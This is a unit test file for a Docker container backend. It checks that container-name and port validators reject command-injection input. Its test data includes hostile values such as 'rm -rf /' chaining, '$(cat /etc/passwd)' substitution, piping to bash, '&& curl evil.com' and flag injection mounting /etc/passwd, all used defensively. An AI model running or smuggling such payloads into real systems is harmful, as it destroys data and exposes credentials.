/**
 * Unit tests — command injection prevention in docker-container-backend.ts
 *
 * Verifies that:
 *   1. `assertSafeContainerName` rejects names with shell metacharacters.
 *   2. `assertSafeContainerName` accepts valid Docker container names.
 *   3. `assertSafePort` rejects non-integer and out-of-range port values.
 *   4. `assertSafePort` accepts valid port numbers.
 *   5. `stop()`, `isActuallyRunning()`, and `start()` throw before touching
 *      execFileSync when given a malicious container name.
 *
 * No Docker daemon is required — all exec calls are mocked.
 */

import { describe, expect, it, mock, beforeEach, afterEach } from 'bun:test';
import {
  assertSafeContainerName,
  assertSafePort,
  DockerContainerBackend,
  type DockerContainerBackendConfig,
} from '../../src/services/docker-container-backend';

// ---------------------------------------------------------------------------
// assertSafeContainerName
// ---------------------------------------------------------------------------

describe('assertSafeContainerName', () => {
  // ── Valid names ──────────────────────────────────────────────────────────

  it('accepts a simple alphanumeric name', () => {
    expect(() => assertSafeContainerName('mca-teros-memory-abc123')).not.toThrow();
  });

  it('accepts names with hyphens, underscores, and dots', () => {
    expect(() => assertSafeContainerName('mca_teros.memory-1')).not.toThrow();
  });

  it('accepts a single character name', () => {
    expect(() => assertSafeContainerName('a')).not.toThrow();
  });

  it('accepts a name of exactly 255 characters', () => {
    const name = 'a' + 'b'.repeat(254);
    expect(() => assertSafeContainerName(name)).not.toThrow();
  });

  // ── Injection payloads ───────────────────────────────────────────────────

  it('rejects a name with semicolon (command chaining)', () => {
    expect(() => assertSafeContainerName('mca-test; rm -rf /')).toThrow(/Invalid container name/);
  });

  it('rejects a name with backtick (command substitution)', () => {
    expect(() => assertSafeContainerName('mca-`whoami`')).toThrow(/Invalid container name/);
  });

  it('rejects a name with $() (command substitution)', () => {
    expect(() => assertSafeContainerName('mca-$(cat /etc/passwd)')).toThrow(/Invalid container name/);
  });

  it('rejects a name with pipe', () => {
    expect(() => assertSafeContainerName('mca-test|bash')).toThrow(/Invalid container name/);
  });

  it('rejects a name with ampersand (background execution)', () => {
    expect(() => assertSafeContainerName('mca-test&id')).toThrow(/Invalid container name/);
  });

  it('rejects a name with newline', () => {
    expect(() => assertSafeContainerName('mca-test\nrm -rf /')).toThrow(/Invalid container name/);
  });

  it('rejects a name with spaces', () => {
    expect(() => assertSafeContainerName('mca test')).toThrow(/Invalid container name/);
  });

  it('rejects a name with double-quote', () => {
    expect(() => assertSafeContainerName('mca-"test"')).toThrow(/Invalid container name/);
  });

  it('rejects a name with single-quote', () => {
    expect(() => assertSafeContainerName("mca-'test'")).toThrow(/Invalid container name/);
  });

  it('rejects a name starting with a hyphen (flag injection)', () => {
    expect(() => assertSafeContainerName('-v/etc/passwd:/etc/passwd')).toThrow(/Invalid container name/);
  });

  it('rejects a name starting with a dot', () => {
    expect(() => assertSafeContainerName('.hidden-container')).toThrow(/Invalid container name/);
  });

  // ── Edge cases ───────────────────────────────────────────────────────────

  it('rejects an empty string', () => {
    expect(() => assertSafeContainerName('')).toThrow(/non-empty string/);
  });

  it('rejects a non-string (number)', () => {
    expect(() => assertSafeContainerName(42 as any)).toThrow(/non-empty string/);
  });

  it('rejects a name longer than 255 characters', () => {
    const name = 'a'.repeat(256);
    expect(() => assertSafeContainerName(name)).toThrow(/too long/);
  });
});

// ---------------------------------------------------------------------------
// assertSafePort
// ---------------------------------------------------------------------------

describe('assertSafePort', () => {
  it('accepts port 1', () => {
    expect(() => assertSafePort(1)).not.toThrow();
  });

  it('accepts port 3000', () => {
    expect(() => assertSafePort(3000)).not.toThrow();
  });

  it('accepts port 65535', () => {
    expect(() => assertSafePort(65535)).not.toThrow();
  });

  it('rejects port 0', () => {
    expect(() => assertSafePort(0)).toThrow(/Invalid port/);
  });

  it('rejects port 65536', () => {
    expect(() => assertSafePort(65536)).toThrow(/Invalid port/);
  });

  it('rejects negative port', () => {
    expect(() => assertSafePort(-1)).toThrow(/Invalid port/);
  });

  it('rejects a float', () => {
    expect(() => assertSafePort(3000.5)).toThrow(/Invalid port/);
  });

  it('rejects NaN', () => {
    expect(() => assertSafePort(NaN)).toThrow(/Invalid port/);
  });

  it('rejects Infinity', () => {
    expect(() => assertSafePort(Infinity)).toThrow(/Invalid port/);
  });
});

// ---------------------------------------------------------------------------
// DockerContainerBackend — injection prevention at the method level
// ---------------------------------------------------------------------------

describe('DockerContainerBackend — injection prevention', () => {
  const config: DockerContainerBackendConfig = {
    mcaBasePath: '/opt/teros/mcas',
    dockerImage: 'teros-mca:latest',
    hostGateway: '172.17.0.1',
    backendPort: 4000,
    portRange: { min: 9000, max: 9100 },
  };

  const backend = new DockerContainerBackend(config);

  // Payloads that would execute arbitrary commands if interpolated into a shell string
  const injectionPayloads = [
    'mca-test; rm -rf /',
    'mca-`whoami`',
    'mca-$(id)',
    'mca-test|bash',
    'mca-test && curl evil.com',
    'mca-test\nrm -rf /',
    '-v/etc/passwd:/host/passwd',
  ];

  describe('stop()', () => {
    for (const payload of injectionPayloads) {
      it(`rejects injection payload: ${JSON.stringify(payload)}`, async () => {
        await expect(backend.stop(payload)).rejects.toThrow(/Invalid container name|non-empty string/);
      });
    }
  });

  describe('isActuallyRunning()', () => {
    for (const payload of injectionPayloads) {
      it(`rejects injection payload: ${JSON.stringify(payload)}`, async () => {
        await expect(backend.isActuallyRunning(payload)).rejects.toThrow(
          /Invalid container name|non-empty string/,
        );
      });
    }
  });

  describe('start()', () => {
    for (const payload of injectionPayloads) {
      it(`rejects injection payload in containerName: ${JSON.stringify(payload)}`, async () => {
        await expect(
          backend.start('mca.teros.memory', payload, 'some-token'),
        ).rejects.toThrow(/Invalid container name|non-empty string/);
      });
    }
  });
});
